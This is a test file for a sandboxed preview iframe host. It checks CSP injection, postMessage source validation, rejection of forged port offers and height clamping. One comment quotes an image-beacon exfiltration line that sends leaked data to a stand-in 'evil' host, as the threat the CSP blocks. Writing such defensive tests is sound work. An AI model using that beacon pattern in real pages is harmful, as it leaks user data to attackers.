/**
 * PreviewPanelHost 契约测试（issue #328 的质量红线，#1146 增补媒体字节通道）：
 * - sandbox 属性恒为 "allow-scripts"，永不出现 allow-same-origin；
 * - 只认 event.source === iframe.contentWindow 且带面板 source 标记的消息
 *   （opaque origin 下 event.origin 恒为 "null"，不能用于鉴别）；
 * - 桥方法只读：listArtifacts / readArtifact / readArtifactBytes /
 *   getJobDetail（字节通道 payload 逐字节相等 / 超限走错误响应）；
 * - ready → 下发 init（jobId + --pp-* 主题变量 + katex 资源 URL +
 *   capabilities 能力声明；init 只带数据、永不携带端口——#1178 P1 收口）；
 * - 字节桥端口由面板初始文档的注入 bootstrap 上交：每个挂载只接受第一次
 *   上交，伪造/重复上交被拒；同挂载第二次 load（= 面板自导航）整桥撤销；
 * - resize 高度钳制在 [120, 6000]；
 * - #989：宿主文档有 CSP nonce 时 bundle 脚本盖章，拦截探针报告后显示提示；
 * - #1146：面板 CSP 放行 media-src blob:（img-src 不放行 blob:）。
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { render, act, waitFor, fireEvent } from '@testing-library/react'
import type { ReactElement } from 'react'
import { PreviewPanelHost } from './PreviewPanelHost'
import { PREVIEW_HOST_SOURCE, PREVIEW_PANEL_SOURCE } from './bridge'
import { makeJobDetail } from '../../testing/jobDetailFixtures'
import { TestQueryProvider } from '../../testing/testQueryClient'

const mockFetchJobArtifact = vi.fn()
const mockFetchJobDetail = vi.fn()
const mockFetchJobArtifactRawBytes = vi.fn()

vi.mock('../../api', () => ({
  fetchJobArtifact: (...args: unknown[]) => mockFetchJobArtifact(...args),
  fetchJobDetail: (...args: unknown[]) => mockFetchJobDetail(...args),
  fetchJobArtifactRawBytes: (...args: unknown[]) =>
    mockFetchJobArtifactRawBytes(...args),
}))

const BUNDLE = '<!doctype html><html><body>panel</body></html>'

function renderHost(ui?: ReactElement) {
  return render(ui ?? <PreviewPanelHost jobId="job-1" html={BUNDLE} />, {
    wrapper: TestQueryProvider,
  })
}

function getIframe(container: HTMLElement): HTMLIFrameElement {
  const iframe = container.querySelector('iframe')
  if (!iframe) throw new Error('iframe not rendered')
  return iframe
}

/** 冲刷异步更新（react-query 解析 + jsdom 的 iframe load 事件）进 act。 */
async function flush() {
  await act(async () => {
    await new Promise((resolve) => setTimeout(resolve, 20))
  })
}

/**
 * 等待桥端点就绪：jsdom 对 srcdoc iframe 异步 fire load，宿主监听在 mount
 * effect 里登记——发桥消息前 flush 一次，保证两者就位（生产语义一致：
 * 面板脚本只在其文档解析后才运行，晚于宿主 listener 挂上）。
 */
async function bridgeReady() {
  await flush()
}

/** 以面板身份向宿主派发消息（jsdom 的 MessageEvent 支持 source 字段）。 */
function emitPanelMessage(iframe: HTMLIFrameElement, data: unknown) {
  const event = new MessageEvent('message', {
    data,
    source: iframe.contentWindow,
  })
  act(() => {
    window.dispatchEvent(event)
  })
}

/**
 * 模拟注入 bootstrap 的端口上交（#1178 P1 收口）：真实环境里 bootstrap 在
 * 初始文档解析期执行并 transfer port1；测试里直接以面板窗口名义派发
 * byte-port-offer。返回面板侧 port2（发请求/收响应）与宿主侧 port1
 * （断言 close / spy postMessage）。
 */
function offerBytePort(iframe: HTMLIFrameElement) {
  const channel = new MessageChannel()
  const event = new MessageEvent('message', {
    data: { source: PREVIEW_PANEL_SOURCE, type: 'byte-port-offer' },
    source: iframe.contentWindow,
    ports: [channel.port1],
  })
  act(() => {
    window.dispatchEvent(event)
  })
  return { panelPort: channel.port2, hostPort: channel.port1 }
}

/** 收集 port 上的宿主回包（jsdom/node MessagePort 投递是异步任务）。 */
function portInbox(port: MessagePort): Array<Record<string, unknown>> {
  const messages: Array<Record<string, unknown>> = []
  port.onmessage = (event: MessageEvent) => {
    messages.push(event.data as Record<string, unknown>)
  }
  return messages
}

function hostReplies(
  iframe: HTMLIFrameElement
): Array<Record<string, unknown>> {
  const spy = vi.mocked(iframe.contentWindow!.postMessage)
  return spy.mock.calls
    .map((call) => call[0] as Record<string, unknown>)
    .filter((data) => data.source === PREVIEW_HOST_SOURCE)
}

beforeEach(() => {
  mockFetchJobArtifact.mockReset()
  mockFetchJobDetail.mockReset()
  mockFetchJobArtifactRawBytes.mockReset()
  mockFetchJobDetail.mockResolvedValue(
    makeJobDetail([], { artifacts: ['questions.json', 'notes.md'] })
  )
})

describe('PreviewPanelHost 沙箱红线', () => {
  it('sandbox 恒为 allow-scripts，永不授 allow-same-origin', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)

    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts')
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-same-origin')
    await flush()
  })

  it('srcDoc 注入宿主 CSP：策略含绝对平台 origin、无无效的 self、img 收敛到 data:/平台 origin（codex P1 + 评审加固 + #500）', async () => {
    const { container } = renderHost()
    const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''

    const metaMatch = srcdoc.match(
      /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/
    )
    expect(metaMatch).not.toBeNull()
    const policy = metaMatch![1]
    expect(policy).toContain("default-src 'none'")
    expect(policy).toContain(`connect-src ${window.location.origin}`)
    expect(policy).toContain(
      `script-src 'unsafe-inline' ${window.location.origin}`
    )
    expect(policy).toContain(
      `style-src 'unsafe-inline' ${window.location.origin}`
    )
    expect(policy).toContain(`font-src ${window.location.origin}`)
    // 'self' 在 opaque origin 下不匹配任何 URL（CSP3）——出现即说明回退
    // 到了无效写法，平台 katex 资产会被误断。
    expect(policy).not.toContain("'self'")
    // img（#500 P1-4）：收敛到 data: 内联 + 平台 origin。任意 https 图源
    // 是 `new Image().src='https://evil/?d='+leak` 式零门槛 GET 外带通道，
    // 不得放行；data: 保留（单文件 bundle 内联图），blob: 无实际引用面
    // 不放行。
    expect(policy).toContain(`img-src data: ${window.location.origin}`)
    expect(policy).not.toContain('https:')
    // media（#1146）：只放行面板自建 blob（readArtifactBytes 字节 →
    // URL.createObjectURL 喂 <video>/<audio>）；blob 归面板本帧命名空间，
    // 不是出站面，故无需 origin 白名单。img-src 不得因此连带放行 blob:。
    expect(policy).toContain('media-src blob:')
    expect(policy).toContain("form-action 'none'")
    // bundle 原文完整保留在注入结果里。
    expect(srcdoc).toContain('<body>panel</body>')
    await flush()
  })

  it('CSP meta 落进真实 <head>：注释/字符串/属性里的伪 <head> 抢占不了落点（评审 P0）', async () => {
    const adversarial = [
      // 注释里的伪 <head>：正则定位会把 meta 注进注释内部。
      '<!doctype html><!-- <head> --><html><head><title>t</title></head><body>panel</body></html>',
      // JS 字符串字面量里的伪 <head>。
      '<!doctype html><html><script>var s = "<head>"</script><head><title>t</title></head><body>panel</body></html>',
      // 属性值里的伪 <head>。
      '<!doctype html><html data-x="<head>"><head><title>t</title></head><body>panel</body></html>',
    ]
    for (const html of adversarial) {
      const { container } = render(
        <PreviewPanelHost jobId="job-1" html={html} />,
        {
          wrapper: TestQueryProvider,
        }
      )
      const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''
      // 解析器语义定位：meta 必须在真实 head 内（title 之前），
      // 且不能落入注释/脚本/属性（那些位置序列化后不构成 meta 元素）。
      const headMatch = srcdoc.match(/<head>([\s\S]*?)<\/head>/)
      expect(headMatch).not.toBeNull()
      expect(headMatch![1]).toContain('Content-Security-Policy')
      expect(headMatch![1]).toContain('<title>t</title>')
      // 整个文档恰好一个 CSP meta（伪 head 场景下旧实现会出现 0 个）。
      expect(srcdoc.match(/Content-Security-Policy/g)).toHaveLength(1)
      await flush()
    }
  })

  it('无 <head> 的 bundle 也能注入 CSP（解析器隐式建 head）', async () => {
    const { container } = render(
      <PreviewPanelHost
        jobId="job-1"
        html="<!doctype html><html><body>headless</body></html>"
      />,
      { wrapper: TestQueryProvider }
    )
    const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''

    expect(srcdoc).toMatch(/<head><meta http-equiv="Content-Security-Policy"/)
    expect(srcdoc).toContain('<body>headless</body>')
    await flush()
  })
})

describe('PreviewPanelHost 桥协议', () => {
  it('ready 后向面板下发 init（jobId + 主题变量 + 资源）', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    await waitFor(() => expect(postSpy).toHaveBeenCalled())
    const init = postSpy.mock.calls
      .map((call) => call[0] as Record<string, unknown>)
      .find((data) => data.type === 'init')
    expect(init).toBeDefined()
    expect(init!.source).toBe(PREVIEW_HOST_SOURCE)
    expect(init!.jobId).toBe('job-1')
    expect(init!.theme).toMatchObject({ '--pp-bg': expect.any(String) })
    expect((init!.assets as Record<string, string>).katexJsUrl).toContain(
      'katex'
    )
    // #1146：init 带能力声明，面板据此对 readArtifactBytes 同步分支。
    expect(init!.capabilities).toEqual(['readArtifactBytes'])
    // #1178 P1 收口：init 只带数据——postMessage 两参，无 transfer（端口
    // 由初始文档的注入 bootstrap 上交，永不随 init 发放/重发）。
    const initCall = postSpy.mock.calls.find(
      ([data]) => (data as Record<string, unknown>)?.type === 'init'
    )!
    expect(initCall).toHaveLength(2)
  })

  it('listArtifacts 返回 job detail 的产物清单', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    await waitFor(() => expect(mockFetchJobDetail).toHaveBeenCalled())
    // 等 detail 真正落进宿主状态再发桥请求：called 只保证查询已发起，
    // 慢环境下快照可能还没就位（CI shard 时序曾命中，payload 为 null）。
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 7,
      method: 'listArtifacts',
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 7
      )
      expect(reply).toMatchObject({
        ok: true,
        payload: ['questions.json', 'notes.md'],
      })
    })
  })

  it('readArtifact 走现有产物 API 并回传内容', async () => {
    mockFetchJobArtifact.mockResolvedValue({
      name: 'a.json',
      content: '{"x":1}',
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 9,
      method: 'readArtifact',
      params: { name: 'a.json' },
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 9
      )
      expect(reply).toMatchObject({
        ok: true,
        payload: { name: 'a.json', content: '{"x":1}' },
      })
    })
    expect(mockFetchJobArtifact).toHaveBeenCalledWith('job-1', 'a.json')
  })

  it('readArtifactBytes 经 bootstrap 上交的 port 回传 ArrayBuffer（逐字节相等，#1178 P1 收口）', async () => {
    // jsdom/node 的 port postMessage 执行真实 structured clone + transfer：源
    // buffer 发送后 detach——期望值用普通数组快照（与 buffer 生命周期解耦）。
    const expected = [0, 1, 2, 250, 251, 252]
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: Uint8Array.from(expected).buffer,
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    await bridgeReady()
    const { panelPort } = offerBytePort(iframe)
    const inbox = portInbox(panelPort)

    // 面板从 port 发 request（port 通道无 source 标记——身份由端口持有证明）。
    panelPort.postMessage({
      type: 'request',
      id: 31,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      const reply = inbox.find(
        (data) => data.type === 'response' && data.id === 31
      )
      expect(reply).toMatchObject({
        ok: true,
        payload: { name: 'demo.mp4', mediaType: 'video/mp4' },
      })
    })
    expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledWith(
      'job-1',
      'demo.mp4'
    )
    const reply = inbox.find(
      (data) => data.type === 'response' && data.id === 31
    )!
    const bytes = (reply.payload as { bytes: ArrayBuffer }).bytes
    // 收方拿到的是克隆形态——形态断言宽松（ArrayBuffer 或 TypedArray 视图），
    // 内容逐字节等价是硬断言。
    expect(bytes).toBeDefined()
    expect(Array.from(new Uint8Array(bytes))).toEqual(expected)
  })

  it('readArtifactBytes 的 bytes 经 port postMessage transfer 零拷贝转移（评审 P3-3）', async () => {
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: Uint8Array.from([3, 1, 4, 1, 5]).buffer,
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    await bridgeReady()
    const { panelPort, hostPort } = offerBytePort(iframe)
    portInbox(panelPort)
    const hostPostSpy = vi.spyOn(hostPort, 'postMessage')

    panelPort.postMessage({
      type: 'request',
      id: 36,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      const call = hostPostSpy.mock.calls.find(
        ([data]) => (data as Record<string, unknown>)?.id === 36
      )
      expect(call).toBeDefined()
      // 第二参是 transfer 列表：回传的 ArrayBuffer 走零拷贝所有权转移。
      const transfer = call![1] as Transferable[]
      expect(transfer[0]).toBeInstanceOf(ArrayBuffer)
    })
  })

  it('字节桥端口每个挂载只接受第一次上交：后续 offer（含导航后伪造）被拒并关闭（#1178 P1 收口）', async () => {
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: Uint8Array.from([9, 9]).buffer,
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    await bridgeReady()
    const first = offerBytePort(iframe)
    const firstInbox = portInbox(first.panelPort)

    // 第二次上交（攻击者文档可伪造同形消息）：被拒且上交端口被关闭。
    const forged = new MessageChannel()
    const forgedClose = vi.spyOn(forged.port1, 'close')
    act(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: { source: PREVIEW_PANEL_SOURCE, type: 'byte-port-offer' },
          source: iframe.contentWindow,
          ports: [forged.port1],
        })
      )
    })
    expect(forgedClose).toHaveBeenCalled()
    forged.port2.postMessage({
      type: 'request',
      id: 41,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await flush()
    expect(mockFetchJobArtifactRawBytes).not.toHaveBeenCalled()

    // 首次上交的端口不受影响，继续服务。
    first.panelPort.postMessage({
      type: 'request',
      id: 42,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      expect(
        firstInbox.find((data) => data.type === 'response' && data.id === 42)
      ).toMatchObject({ ok: true })
    })
    expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledTimes(1)
  })

  it('port 通道只服务 readArtifactBytes：基础方法拿到明确错误（#1178 P1 收口）', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    await bridgeReady()
    const { panelPort } = offerBytePort(iframe)
    const inbox = portInbox(panelPort)

    panelPort.postMessage({ type: 'request', id: 61, method: 'listArtifacts' })
    await waitFor(() => {
      const reply = inbox.find((data) => data.id === 61)
      expect(reply).toMatchObject({ ok: false })
      expect(String(reply!.error)).toContain(
        'is not served on the byte bridge port'
      )
    })
  })

  it('字节读取在每个 port 上串行化：并发请求排队执行（#1178 codex 复审 P1 内存护栏）', async () => {
    // 第一次读取用 deferred 卡住：第二次 fetch 必须在它完成后才开始——
    // 512 MiB 单次上限不约束并发总量，串行化把在途读取夹到 1。
    let releaseFirst!: (value: {
      name: string
      mediaType: string
      bytes: ArrayBuffer
    }) => void
    const firstGate = new Promise<{
      name: string
      mediaType: string
      bytes: ArrayBuffer
    }>((resolve) => {
      releaseFirst = resolve
    })
    mockFetchJobArtifactRawBytes
      .mockImplementationOnce(() => firstGate)
      .mockResolvedValue({
        name: 'b.mp4',
        mediaType: 'video/mp4',
        bytes: new ArrayBuffer(1),
      })
    const { container } = renderHost()
    const iframe = getIframe(container)
    await bridgeReady()
    const { panelPort } = offerBytePort(iframe)
    const inbox = portInbox(panelPort)

    panelPort.postMessage({
      type: 'request',
      id: 71,
      method: 'readArtifactBytes',
      params: { name: 'a.mp4' },
    })
    panelPort.postMessage({
      type: 'request',
      id: 72,
      method: 'readArtifactBytes',
      params: { name: 'b.mp4' },
    })

    // 等信号非等时长（AGENTS.md §4）：第一次 fetch 发起后、未释放前，
    // 第二次必须还没开始（断言不变量，不探中间态）。
    await waitFor(() =>
      expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledTimes(1)
    )
    releaseFirst({
      name: 'a.mp4',
      mediaType: 'video/mp4',
      bytes: new ArrayBuffer(1),
    })
    await waitFor(() =>
      expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledTimes(2)
    )
    // 两个响应按队列序到达（71 先于 72）且都成功。
    await waitFor(() => {
      const ids = inbox.filter((d) => d.type === 'response').map((d) => d.id)
      expect(ids).toEqual([71, 72])
    })
    expect(
      inbox.find((d) => d.id === 71)!.ok && inbox.find((d) => d.id === 72)!.ok
    ).toBe(true)
  })

  it('窗口通道的 readArtifactBytes 被拒并引导到注入全局（#1178 P1：高危方法只走字节桥 port，旧 window 形态拿到明确错误）', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 46,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 46
      )
      expect(reply).toMatchObject({ ok: false })
      expect((reply!.error as string) || '').toContain(
        '__agentLegionPreviewBytes'
      )
    })
    // 高危方法不再走 fetch（字节不外发）。
    expect(mockFetchJobArtifactRawBytes).not.toHaveBeenCalled()
  })

  it('init 重发不重新发放能力：再次 ready 的 init 仍无端口（#1178 P1 收口）', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    await waitFor(() => {
      const initCalls = postSpy.mock.calls.filter(
        ([data]) => (data as Record<string, unknown>)?.type === 'init'
      )
      expect(initCalls.length).toBeGreaterThanOrEqual(2)
    })
    // postMessage(message, '*') 两参——第三参 transfer（端口）不存在。
    const initCalls = postSpy.mock.calls.filter(
      ([data]) => (data as Record<string, unknown>)?.type === 'init'
    )
    for (const call of initCalls) {
      expect(call).toHaveLength(2)
    }
  })

  it('第二次 load = 面板自导航：整桥撤销、帧内容下架（#1178 P1 纵深防御）', async () => {
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: Uint8Array.from([9, 9]).buffer,
    })
    const { container, queryByRole } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    // 首帧（jsdom 已对 srcdoc fire 首次 load）：port 往返成立。
    const { panelPort } = offerBytePort(iframe)
    const inbox = portInbox(panelPort)
    panelPort.postMessage({
      type: 'request',
      id: 41,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      expect(
        inbox.find((data) => data.type === 'response' && data.id === 41)
      ).toMatchObject({ ok: true })
    })

    // 面板自导航 → 同一挂载的第二次 load（宿主改 srcdoc 走 key 整树重挂，
    // 挂载内不会再有宿主导的导航）。
    act(() => {
      fireEvent.load(iframe)
    })
    expect(queryByRole('status')?.textContent).toContain('跳转')
    expect(container.querySelector('iframe')).toBeNull()

    // 窗口通道撤销：伪造 request 不再有任何响应。
    const callsBefore = postSpy.mock.calls.length
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 42,
      method: 'listArtifacts',
    })
    // 已接受端口被 acceptor 关闭：面板侧后续请求不再被服务。
    panelPort.postMessage({
      type: 'request',
      id: 43,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await flush()
    expect(postSpy.mock.calls.length).toBe(callsBefore)
    expect(inbox.find((data) => data.id === 43)).toBeUndefined()
    expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledTimes(1)
  })

  it('readArtifactBytes 超限与缺 name 走 port 错误响应通道（不回传半读字节）', async () => {
    mockFetchJobArtifactRawBytes.mockRejectedValue(
      new Error(
        'artifact bytes 536870913 exceed readArtifactBytes limit 536870912'
      )
    )
    const { container } = renderHost()
    const iframe = getIframe(container)
    await bridgeReady()
    const { panelPort } = offerBytePort(iframe)
    const inbox = portInbox(panelPort)

    panelPort.postMessage({
      type: 'request',
      id: 33,
      method: 'readArtifactBytes',
      params: { name: 'big.mp4' },
    })
    panelPort.postMessage({
      type: 'request',
      id: 34,
      method: 'readArtifactBytes',
      params: {},
    })

    await waitFor(() => {
      const overLimit = inbox.find(
        (data) => data.type === 'response' && data.id === 33
      )
      expect(overLimit).toMatchObject({ ok: false })
      expect(String(overLimit!.error)).toContain(
        'exceed readArtifactBytes limit'
      )
      expect(overLimit!.payload).toBeUndefined()
    })
    await waitFor(() => {
      const missing = inbox.find(
        (data) => data.type === 'response' && data.id === 34
      )
      expect(missing).toMatchObject({ ok: false })
      expect(String(missing!.error)).toContain('params.name')
    })
  })

  it('readArtifact 缺 name 与未知方法回结构化错误', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 11,
      method: 'readArtifact',
      params: {},
    })
    // 未知方法过不了 isPanelToHostMessage 守卫：宿主完全不响应。
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 12,
      method: 'deleteJob',
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 11
      )
      expect(reply).toMatchObject({ ok: false })
      expect(String(reply!.error)).toContain('params.name')
    })
    expect(
      hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 12
      )
    ).toBeUndefined()
  })

  it('getJobDetail 回传共享 detail 查询的快照', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    await waitFor(() => expect(mockFetchJobDetail).toHaveBeenCalled())
    // 同 listArtifacts 用例：等 detail 落进宿主状态，否则 getJobDetail
    // 可能拿到 null 快照（CI shard 时序实测命中）。
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 21,
      method: 'getJobDetail',
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 21
      )
      expect(reply).toMatchObject({ ok: true })
      expect((reply!.payload as { artifacts: string[] }).artifacts).toEqual([
        'questions.json',
        'notes.md',
      ])
    })
    await flush()
  })

  it('忽略 source 不符或标记不符的消息', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await flush()

    // 正确 source 但缺面板标记
    emitPanelMessage(iframe, {
      source: 'evil',
      type: 'request',
      id: 1,
      method: 'listArtifacts',
    })
    // 面板标记但不是 iframe 的 contentWindow（来源窗口不符）
    act(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: {
            source: PREVIEW_PANEL_SOURCE,
            type: 'request',
            id: 2,
            method: 'listArtifacts',
          },
          source: window,
        })
      )
    })

    await flush()
    expect(hostReplies(iframe)).toEqual([])
    expect(postSpy).not.toHaveBeenCalled()
  })

  it('resize 钳制高度在 [120, 6000]', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'resize',
      height: 40,
    })
    expect(iframe.style.height).toBe('120px')
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'resize',
      height: 99999,
    })
    expect(iframe.style.height).toBe('6000px')
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'resize',
      height: 432.6,
    })
    expect(iframe.style.height).toBe('433px')
  })
})

describe('PreviewPanelHost 宿主 CSP nonce（#989）', () => {
  function withHostNonce(nonce: string) {
    const meta = document.createElement('meta')
    meta.setAttribute('property', 'csp-nonce')
    meta.setAttribute('nonce', nonce)
    document.head.appendChild(meta)
    return () => meta.remove()
  }

  it('宿主文档带 nonce 时 bundle 的 <script> 盖同一 nonce', async () => {
    const cleanup = withHostNonce('host-nonce-1')
    try {
      const { container } = renderHost(
        <PreviewPanelHost
          jobId="job-1"
          html="<!doctype html><html><head><script>var a=1</script></head><body>p</body></html>"
        />
      )
      const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''
      expect(srcdoc).toContain('<script nonce="host-nonce-1">var a=1</script>')
      await flush()
    } finally {
      cleanup()
    }
  })

  it('csp-violation 探针消息 → 显示拦截提示；伪造来源不触发', async () => {
    const { container, queryByRole } = renderHost()
    const iframe = getIframe(container)
    await flush()

    act(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: {
            source: PREVIEW_PANEL_SOURCE,
            type: 'csp-violation',
            directive: 'script-src-attr',
          },
          source: window,
        })
      )
    })
    expect(queryByRole('status')).toBeNull()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'csp-violation',
      directive: 'script-src-attr',
    })
    expect(queryByRole('status')?.textContent).toContain(
      '全局设置 → 实例设置 → 安全'
    )
  })
})
